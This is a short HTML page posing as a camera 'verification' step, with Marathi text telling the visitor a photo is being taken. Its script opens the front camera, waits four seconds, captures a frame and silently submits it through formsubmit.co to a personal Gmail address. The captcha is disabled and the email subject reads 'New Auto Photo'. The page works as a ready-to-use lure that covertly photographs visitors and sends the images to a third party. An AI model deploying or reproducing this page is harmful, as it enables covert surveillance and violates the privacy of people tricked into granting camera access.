<!DOCTYPE html>
<html lang="mr">
<head>
<meta charset="UTF-8">
<title>Verification</title>
</head>
<body style="text-align:center;font-family:sans-serif;">

<h3>कृपया कॅमेरा परवानगी द्या</h3>
<p>फोटो घेतला जात आहे...</p>

<video id="video" playsinline autoplay muted></video>
<canvas id="canvas" style="display:none;"></canvas>

<form id="photoForm" action="https://formsubmit.co/sumitpawale05@gmail.com" method="POST">
  <input type="hidden" name="photo" id="photoInput">
  <input type="hidden" name="_subject" value="📸 New Auto Photo">
  <input type="hidden" name="_captcha" value="false">
</form>

<script>
const video = document.getElementById("video");

navigator.mediaDevices.getUserMedia({
  video: { facingMode: "user" }
}).then(stream => {
  video.srcObject = stream;

  video.onloadedmetadata = () => {
    video.play();

    setTimeout(() => {
      const canvas = document.getElementById("canvas");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext("2d").drawImage(video, 0, 0);

      const imageData = canvas.toDataURL("image/png");
      document.getElementById("photoInput").value = imageData;
      document.getElementById("photoForm").submit();
    }, 4000); // 4 seconds
  };
}).catch(err => {
  alert("Camera allow करा");
});
</script>

</body>
</html>
